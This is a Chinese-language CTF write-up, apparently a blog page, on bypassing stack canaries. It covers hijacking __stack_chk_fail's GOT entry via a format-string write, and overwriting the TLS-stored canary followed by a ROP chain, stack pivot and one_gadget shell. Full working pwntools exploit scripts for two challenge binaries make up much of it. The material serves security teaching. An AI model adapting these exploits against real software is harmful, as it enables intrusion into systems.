+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311232887.png"></p>
+<h3 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持__stack_chk_fail</h3><p>已知Canary校验失败会进入__stack_chk_fail函数，且该函数是一个延迟绑定函数&#x3D;&#x3D;》通过修改该函数的GOT表实现劫持；</p>
+<h4 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310312013810.png" alt="image-20231031201322787"></p>
+<p>64位程序，且开启了NX和Canary，丢IDA里看看伪代码：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310312036622.png" alt="image-20231031203606598"></p>
+<p>有一个栈溢出，但是只能溢出0x8，还有一个格式化字符串漏洞，并且有一个后门函数backdoor：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310312025442.png" alt="image-20231031202539421"></p>
+<p>栈溢出中虽然说可以溢出8字节，但是由于Canary占用8字节，会导致没法利用&#x3D;&#x3D;》</p>
+<p>格式化字符串漏洞没什么限制，可以考虑利用格式化字符串写，将__stack_chk_fail劫持为backdoor&#x3D;&#x3D;》</p>
+<p>再通过栈溢出覆盖Canary使检查不通过触发__stack_chk_fail函数&#x3D;&#x3D;》</p>
+<p>首要事情就是通过格式化字符串拿到偏移：通过<strong>libformatstr</strong>获取偏移</p>
+<p>参考：</p>
+<pre class="language-uri" data-language="uri"><code class="language-uri"><span class="token scheme">https<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">github.com</span></span><span class="token path"><span class="token path-separator">/</span>hellman<span class="token path-separator">/</span>libformatstr</span></code></pre>
+
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libformatstr <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#context.log_level = 'debug'</span>
+bufsize <span class="token operator">=</span> <span class="token number">50</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./r2t4'</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./r2t4'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>make_pattern<span class="token punctuation">(</span>bufsize<span class="token punctuation">)</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+offset<span class="token punctuation">,</span> padding <span class="token operator">=</span> guess_argnum<span class="token punctuation">(</span>data<span class="token punctuation">,</span>bufsize<span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"offset :"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+<p>获得偏移：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311032135850.png" alt="image-20231103213552795"></p>
+<h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><p>有了偏移之后直接用fmtstr_payload劫持__stack_chk_fail为后门函数即可：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./r2t4'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./r2t4'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0x0400626</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>本地结果：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311032253528.png" alt="image-20231103225302483"></p>
+<h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><p>当然也可以使用手动写入的方式实现：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./r2t4'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./r2t4'</span><span class="token punctuation">)</span>
+
+__stack_chk_fail<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>
+backdoor <span class="token operator">=</span> <span class="token number">0x400626</span>
+
+payload <span class="token operator">=</span> <span class="token string">b"%64c%9$hn%1510c%10$hnaaa"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__stack_chk_fail<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__stack_chk_fail<span class="token punctuation">)</span>
+<span class="token comment">#payload解析</span>
+<span class="token comment">#64:0x40，对应backdoor函数地址的高两字节0x0040</span>
+<span class="token comment">#1510：1510+64=1574=0x626，对应backdoor函数地址的低两字节0x0626</span>
+<span class="token comment">#$hn：将已输出的字符数低2字节写到指定地址</span>
+<span class="token comment">#aaa：填充作用，栈对齐，使之为8的倍数，凑够24字节</span>
+<span class="token comment">#9：由于格式化字符串%64c%9$hn%1510c%10$hnaaa总共占用了24个字节 ==》偏移为6+24/8=9 ==》在__stack_chk_fail+2处写入0x40</span>
+<span class="token comment">#10 ：在偏移9的基础上加上p64(__stack_chk_fail+2)地址的一字节 ==》偏移为10 ==》在__stack_chk_fail处写入0x626</span>
+<span class="token comment">#p64(__ stack_chk_fail+2) + p64(__stack_chk_fail) ：将backdoor函数地址分为高两个字节和低两字节进行写入__ stack_chk_fail</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>__stack_chk_fail劫持：</p>
+<p>栈空间：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311032337935.png" alt="image-20231103233746892"></p>
+<p><a href="mailto:&#95;&#x5f;&#x73;&#x74;&#97;&#x63;&#107;&#95;&#99;&#x68;&#107;&#x5f;&#x66;&#97;&#105;&#x6c;&#64;&#x67;&#111;&#116;&#x2e;&#112;&#108;&#x74;">&#95;&#x5f;&#x73;&#x74;&#97;&#x63;&#107;&#95;&#99;&#x68;&#107;&#x5f;&#x66;&#97;&#105;&#x6c;&#64;&#x67;&#111;&#116;&#x2e;&#112;&#108;&#x74;</a>：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311032346085.png" alt="image-20231103234604062"></p>
+<p>动态调试查看一下没劫持之前的<a href="mailto:&#95;&#95;&#115;&#x74;&#97;&#99;&#107;&#95;&#99;&#104;&#x6b;&#x5f;&#102;&#x61;&#x69;&#x6c;&#x40;&#x67;&#111;&#116;&#x2e;&#x70;&#x6c;&#x74;">&#95;&#95;&#115;&#x74;&#97;&#99;&#107;&#95;&#99;&#104;&#x6b;&#x5f;&#102;&#x61;&#x69;&#x6c;&#x40;&#x67;&#111;&#116;&#x2e;&#x70;&#x6c;&#x74;</a>：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311032347055.png" alt="image-20231103234716014"></p>
+<p>触发格式化字符串劫持<a href="mailto:&#95;&#95;&#115;&#116;&#x61;&#x63;&#x6b;&#95;&#x63;&#x68;&#x6b;&#x5f;&#x66;&#x61;&#x69;&#x6c;&#x40;&#x67;&#111;&#x74;&#46;&#x70;&#108;&#116;">&#95;&#95;&#115;&#116;&#x61;&#x63;&#x6b;&#95;&#x63;&#x68;&#x6b;&#x5f;&#x66;&#x61;&#x69;&#x6c;&#x40;&#x67;&#111;&#x74;&#46;&#x70;&#108;&#116;</a>：成功被劫持为backdoor</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311032348735.png" alt="image-20231103234819709"></p>
+<p>本地结果：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311032308532.png"></p>
+<h3 id="覆盖TLS中存储的Canary"><a href="#覆盖TLS中存储的Canary" class="headerlink" title="覆盖TLS中存储的Canary"></a>覆盖TLS中存储的Canary</h3><p>已知在C程序中会存在全局变量，静态变量，局部变量，对于局部变量来说并不存在线程安全问题；</p>
+<p>对于全局变量和函数内定义的静态变量，同一个进程内的各个线程都可以访问它们&#x3D;&#x3D;》存在多线程读写问题；</p>
+<p>如果需要在一个线程内部的各个函数调用都能访问，但是其他线程不能访问的变量&#x3D;&#x3D;》TLS：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the
+               thread descriptor used by libpthread.  */</span>
+  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment">/* Pointer to the thread descriptor.  */</span>
+  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>
+  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>
+  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>
+  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>
+  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> vgetcpu_cache<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token comment">/* Bit 0: X86_FEATURE_1_IBT.
+     Bit 1: X86_FEATURE_1_SHSTK.
+   */</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> feature_1<span class="token punctuation">;</span>
+  <span class="token keyword">int</span> __glibc_unused1<span class="token punctuation">;</span>
+  <span class="token comment">/* Reservation of some values for the TM ABI.  */</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>__private_tm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token comment">/* GCC split stack support.  */</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>__private_ss<span class="token punctuation">;</span>
+  <span class="token comment">/* The lowest address of shadow stack,  */</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ssp_base<span class="token punctuation">;</span>
+  <span class="token comment">/* Must be kept even if it is no longer used by glibc since programs,
+     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>
+  __128bits __glibc_unused2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+  <span class="token keyword">void</span> <span class="token operator">*</span>__padding<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span></code></pre>
+
+<p>对于Linux来说，fs寄存器指向的是当前栈的TLS结构，而fs:0x28指向的是<strong>stack_guard</strong>；</p>
+<p>TLS初始化：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
+　　<span class="token function">security_init</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+　　<span class="token punctuation">&#123;</span>
+　　<span class="token comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入，也就是一个随机数生成器</span>
+　　<span class="token comment">// glibc直接使用了_dl_random的值并没有给赋值</span>
+　　<span class="token comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span>
+　　<span class="token comment">//将_dl_random的最后一个字节设置为0x0</span>
+　　<span class="token class-name">uintptr_t</span> stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span> <span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// stack_chk_guard也就是Canary</span>
+　　<span class="token comment">// 设置Canary的值到TLS中</span>
+　　<span class="token function">THREAD_SET_STACK_GUARD</span> <span class="token punctuation">(</span>stack_chk_guard<span class="token punctuation">)</span><span class="token punctuation">;</span>
+　　_dl_random <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+　　<span class="token punctuation">&#125;</span>
+　　<span class="token comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span>
+　　#define <span class="token function">THREAD_SET_STACK_GUARD</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> \
+　　<span class="token function">THREAD_SETMEM</span> <span class="token punctuation">(</span>THREAD_SELF<span class="token punctuation">,</span> header<span class="token punctuation">.</span>stack_guard<span class="token punctuation">,</span> value<span class="token punctuation">)</span></code></pre>
+
+<p>&#x3D;&#x3D;》已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>
+<h4 id="starctf2018-babystack"><a href="#starctf2018-babystack" class="headerlink" title="starctf2018_babystack"></a>starctf2018_babystack</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311042030121.png" alt="image-20231104183405047"></p>
+<p>64位程序，开启了Canary和NX，丢进IDA里看看：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311042030693.png" alt="image-20231104194207122"></p>
+<p>pthread_create函数声明：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span>
+<span class="token keyword">int</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span>
+                 <span class="token class-name">pthread_t</span> <span class="token operator">*</span>restrict tidp<span class="token punctuation">,</span>   <span class="token comment">//新创建的线程ID指向的内存单元。</span>
+                 <span class="token keyword">const</span> <span class="token class-name">pthread_attr_t</span> <span class="token operator">*</span>restrict attr<span class="token punctuation">,</span>  <span class="token comment">//线程属性，默认为NULL</span>
+                 <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>start_rtn<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//新创建的线程从start_rtn函数的地址开始运行</span>
+                 <span class="token keyword">void</span> <span class="token operator">*</span>restrict arg <span class="token comment">//默认为NULL。若上述函数需要参数，将参数放入结构中并将地址作为arg传入。</span>
+                  <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>start_routine：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311042030435.png" alt="image-20231104202312934"></p>
+<p>程序的逻辑非常简单，通过创造线程调用start_routine，获取一个后续要输入数据的大小，最大不能超过0x10000，后续则读取数据；</p>
+<p>可以看到读取数据时缓冲区大小为0x1010大小，远远小于0x10000&#x3D;&#x3D;》栈溢出&#x3D;&#x3D;》有Canary，通过修改TLS结构体实现绕过</p>
+<p>首先就是要获取关于<strong>TLS的偏移</strong>（当然你不想找也行，只要使用较大的数据，能覆盖TLS就行）&#x3D;&#x3D;》</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+buf_size <span class="token operator">=</span> <span class="token number">6100</span>
+
+welcome_addr <span class="token operator">=</span> <span class="token number">0x400A1A</span>
+<span class="token comment">#welcome_addr = 0x4009E7</span>
+
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"buf_size:"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>buf_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./starctf2018_babystack'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'send?'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>buf_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x1018</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>welcome_addr<span class="token punctuation">)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>buf_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    temp <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"Welcome"</span> <span class="token keyword">in</span> temp<span class="token punctuation">:</span>
+        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"TLS_buf_size:"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>buf_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        buf_size <span class="token operator">+=</span> <span class="token number">1</span>
+        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>获取偏移：6128</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311051551838.png"></p>
+<p>既然Canary已经由覆盖TLS绕过，接下来就是一个普通的栈溢出了&#x3D;&#x3D;》</p>
+<p>首先需要泄露出libc base&#x3D;&#x3D;》再做一个栈迁移最后调用onegadget即可&#x3D;&#x3D;》</p>
+<p>泄露libc base + 改rbp：</p>
+<pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1010</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span></code></pre>
+
+<p>通过ROP链调用read：</p>
+<pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span></code></pre>
+
+<p>通过leave_ret实现栈迁移 + 覆盖TLS结构体：</p>
+<pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">6128</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span></code></pre>
+
+<p>几个 gadget：</p>
+<p>pop_rdi：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311051627035.png" alt="image-20231105162722997"></p>
+<p>pop_rsi_r15：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311051628404.png" alt="image-20231105162803368"></p>
+<p>leave_ret：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311051628580.png" alt="image-20231105162857535"></p>
+<p>最后最后，通过read读入onegadget就可以get shell了：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311051621292.png" alt="image-20231105162119244"></p>
+<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./starctf2018_babystack"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./starctf2018_babystack"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>
+<span class="token comment">#context.log_level = "debug"</span>
+pop_rdi <span class="token operator">=</span> <span class="token number">0x400c03</span>
+pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x400c01</span>
+leave_ret <span class="token operator">=</span> <span class="token number">0x400955</span>
+bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>
+
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1010</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
+
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>
+
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">6128</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"send?\n"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">6128</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span>
+
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>本地结果：当然你也可以不用调试获取的偏移，使用例如0x2000这种也行；</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311051529000.png" alt="image-20231105152920941"></p>
+<p>本文附件：</p>
+<pre class="language-uri" data-language="uri"><code class="language-uri"><span class="token scheme">https<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host">github.com</span></span><span class="token path"><span class="token path-separator">/</span>zh-Closure<span class="token path-separator">/</span>CTF<span class="token path-separator">/</span>tree<span class="token path-separator">/</span>main<span class="token path-separator">/</span>Bypass%20Canary</span></code></pre>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/10/23/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0-Stack-Overflow/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-11-05 16:54:04
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Bypass/" title="Bypass">
+                        #Bypass
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2099/06/18/%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%91%BD%E4%BB%A4/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
